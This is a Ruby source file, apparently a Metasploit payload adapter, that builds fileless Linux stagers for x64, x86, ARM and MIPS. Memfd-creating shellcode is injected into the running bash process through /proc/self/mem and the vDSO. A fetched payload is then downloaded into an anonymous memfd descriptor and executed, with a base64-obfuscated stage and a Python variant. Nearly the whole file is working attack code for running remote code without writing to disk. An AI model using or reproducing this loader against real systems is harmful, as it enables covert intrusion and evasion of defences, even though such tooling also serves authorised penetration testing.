module Msf::Payload::Adapter::Fetch::Fileless
  
  def _generate_first_stage_shellcode(arch)
    case arch
    when 'x64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = %(
      start:
          xor rsi, rsi
          push rsi
          push rsp
          pop rdi
          mov rax, 0xfffffffffffffec1 
          neg rax
          syscall
          mov rdi,rax
          mov al, 0x4d
          syscall
          push 0x22
          pop rax
          syscall

      )
      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    when 'x86'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm= %(
        xor ecx, ecx
        push ecx
        lea ebx, [esp]
        inc ecx
        mov eax, 0xfffffe9c
        neg eax
        int 0x80
        mov ebx, eax
        mov al, 0x5d
        int 0x80
        mov al, 0x1d
        int 0x80
      )
      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
    when 'aarch64'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pid = getpid()
      # kill(pid,SIGSTOP)
      in_memory_loader_asm = [
          0x000080d2, #0x1000:	mov	x0, #0	0x000080d2
          0xe00f1ff8, #0x1004:	str	x0, [sp, #-0x10]!	0xe00f1ff8
          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
          0x210001ca, #0x100c:	eor	x1, x1, x1	0x210001ca
          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
          0x010000d4, #0x1014:	svc	#0	0x010000d4
          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
          0x010000d4, #0x101c:	svc	#0	0x010000d4
          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
          0x010000d4, #0x1024:	svc	#0	0x010000d4
          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
          0x010000d4, #0x1030:	svc	#0	0x010000d4

      ]
      payload = in_memory_loader_asm.pack("N*")
    when 'armle'
      in_memory_loader_asm = [
        0xe3b02000, #0x1000:	movs	r2, #0	0xe3b02000
        0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
        0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
        0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
        0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
        0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
        0xef000000, #0x1018:	svc	#0	0xef000000
        0xe3a0705d, #0x101c:	mov	r7, #0x5d	0xe3a0705d
        0xef000000, #0x1020:	svc	#0	0xef000000
        0xe3a0701d, #0x1024:	mov	r7, #0x1d	0xe3a0701d
        0xef000000, #0x1028:	svc	#0	0xef000000
      ]
      payload = in_memory_loader_asm.pack("V*")
    when 'armbe'
      # fd = memfd_create()
      # ftruncate(fd, null)
      # pause()
      in_memory_loader_asm = [
        0x0020b0e3, #0x1000:	movs	r2, #0	0x0020b0e3
        0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
        0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
        0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
        0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
        0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
        0x000000ef, #0x1018:	svc	#0	0x000000ef
        0x5d70a0e3, #0x101c:	mov	r7, #0x5d	0x5d70a0e3
        0x000000ef, #0x1020:	svc	#0	0x000000ef
        0x1d70a0e3, #0x1024:	mov	r7, #0x1d	0x1d70a0e3
        0x000000ef, #0x1028:	svc	#0	0x000000ef
]
      payload = in_memory_loader_asm.pack("V*")
    when 'mips64'
      in_memory_loader_asm = [
        0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
        0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
        0x240214c2, #0x1008:	addiu	$v0, $zero, 0x14c2	0x240214c2
        0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
        0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
        0x240213d3, #0x1014:	addiu	$v0, $zero, 0x13d3	0x240213d3
        0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
        0x240213a9, #0x101c:	addiu	$v0, $zero, 0x13a9	0x240213a9
        0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
      ]
      payload = in_memory_loader_asm.pack('N*')
    when 'mipsbe'
      in_memory_loader_asm = [
          0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
          0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
          0x24021102, #0x1008:	addiu	$v0, $zero, 0x1102	0x24021102
          0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
          0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
          0x24020ffd, #0x1014:	addiu	$v0, $zero, 0xffd	0x24020ffd
          0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
          0x24020fbd, #0x101c:	addiu	$v0, $zero, 0xfbd	0x24020fbd
          0x0101010c, #0x1020:	syscall	0x40404	0x0101010c

      ]
      payload = in_memory_loader_asm.pack('N*')
    when 'mipsle'
      in_memory_loader_asm = [
          0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
          0x01000524, #0x1004:	addiu	$a1, $zero, 1	0x01000524
          0x02110224, #0x1008:	addiu	$v0, $zero, 0x1102	0x02110224
          0x0c010101, #0x100c:	syscall	0x40404	0x0c010101
          0x2520e003, #0x1010:	move	$a0, $ra	0x2520e003
          0xfd0f0224, #0x1014:	addiu	$v0, $zero, 0xffd	0xfd0f0224
          0x0c010101, #0x1018:	syscall	0x40404	0x0c010101
          0xbd0f0224, #0x101c:	addiu	$v0, $zero, 0xfbd	0xbd0f0224
          0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
]
      payload = in_memory_loader_asm.pack('N*')

    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
    return payload
  end

  def _generate_jmp_instruction(arch)
    #
    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
    
    case arch
    # x64 shellcode
    # mov rax, [target address]
    # jmp rax
    when 'x64'
      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    
    # x86 shellcode
    # mov eax, [target address]
    # jmp eax
    when 'x86'
      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
    
    # ARM64 shellcode
    # ldr x0, #8
    # br x0
    when 'aarch64'
      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    
    # ARMle shelcode
    # ldr.w r2, [pc, #4]
    # bx    r2 
    when 'armle'
      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    
    # ARMbe shelcode
    # ldr.w r2, [pc, #4]
    # bx    r2 
    when 'armbe'
      %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
    
    # MIPSEL shellcode
    # bgezal $zero, 4
    # xor $t2, $t2,$t2
    # lw	$t2, 16($ra)
    # jr $t2
    when 'mipsle'
      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
    
    # MIPSBE shellcode
    # bgezal $zero, 4
    # xor $t2, $t2,$t2
    # lw	$t2, 16($ra)
    # jr $t2
    when 'mipsbe'
      %^"0411000000000000014a50268fea00100140000800000000"$(echo $(printf %04x $vdso_addr))^
    
    # MIPS64 shellcode
    # bgezal $zero, 4
    # xor $t2, $t2,$t2
    # ld	$t2, 16($ra)
    # jr $t2
    when 'mips64'
      %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
    
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
    end
  end

# Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
# New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
def _generate_fileless_shell(get_file_cmd, arch)
  stage_cmd = %<writebytes () { printf \\\\%03o "$@" ; };>
  stage_cmd << %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
  stage_cmd << %(jmp=#{_generate_jmp_instruction(arch)};)
  stage_cmd << %(sc='#{_generate_first_stage_shellcode(arch).unpack("H*")[0]}';)
  stage_cmd << 'read syscall_info < /proc/self/syscall;'
  stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
  stage_cmd << 'exec 3>/proc/self/mem;'
  stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
  stage_cmd << %(printf "$(writebytes `printf $sc | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
  stage_cmd << 'exec 3>&-;'
  stage_cmd << 'exec 3>/proc/self/mem;'
  stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
  stage_cmd << %(printf "$(writebytes `printf $jmp | sed 's/.\\{2\\}/0x& /g'`)" >&3;)

  cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | ${SHELL} & "
  cmd << 'cd /proc/$!;'
  cmd << 'og_process=$!;'
  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
  cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'

  cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
  cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
  cmd << "then if $(#{get_file_cmd} >/dev/null);"
  cmd << 'then $f & FOUND=1;break;'
  cmd << 'fi;'
  cmd << 'fi;'
  cmd << 'done;'
  cmd << 'fi;'
  cmd << 'sleep 2;' #adding short pause to give process time to load file handle
  cmd << 'kill -9 $og_process;'
end
  
  # same idea as _generate_fileless function, but force creating anonymous file handle
  def _generate_fileless_python(get_file_cmd)
    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
  end
  
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
  def _generate_fileless_bash_search(get_file_cmd)
    # get list of all $USER's processes
    cmd = 'FOUND=0'
    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
    # already found anonymous file where we can write
    cmd << '; do if [ $FOUND -eq 0 ]'

    # look for every symbolic link with write rwx permissions
    # if found one, try to download payload into the anonymous file
    # and execute it
    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
    cmd << '; then $f'
    cmd << '; FOUND=1'
    cmd << '; break'
    cmd << '; fi'
    cmd << '; fi'
    cmd << '; done'
    cmd << '; fi'
    cmd << '; done'

    cmd
  end

end

